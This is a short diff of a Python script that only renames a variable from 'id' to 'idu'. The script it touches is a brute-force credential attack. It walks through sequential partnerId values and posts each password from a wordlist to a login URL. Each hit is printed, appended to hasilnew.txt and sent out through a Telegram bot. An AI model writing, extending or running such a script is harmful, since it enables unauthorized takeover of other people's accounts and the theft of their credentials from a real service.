@@ -10,23 +10,23 @@ def ste(use):
     bot.sendMessage(idd,use)
 
 
-def search(id,pw):
+def search(idu,pw):
           for i in range(100):
-             id +=1
+             idu +=1
              for line in pw:
                  pwd = line.strip()
                  try:
-                     da={'partnerId':id,'pwd':pwd}
+                     da={'partnerId':idu,'pwd':pwd}
                      resp = requests.post(url1,data=da)
                      if 'S' in str(resp.text):
-                          print(id,pwd,'Found Fuck')
-                          usp = f"{id} : {pwd}"
+                          print(idu,pwd,'Found Fuck')
+                          usp = f"{idu} : {pwd}"
                           ste(usp)
                           r = open('hasilnew.txt','a')
-                          r.write('{} : {}\n'.format(id,pwd))
+                          r.write('{} : {}\n'.format(idu,pwd))
                           r.close()
                      else:
-                          print(id,pwd,"wrong")
+                          print(idu,pwd,"wrong")
                  except ConnectionError:
                       time.sleep(3)
 def program():
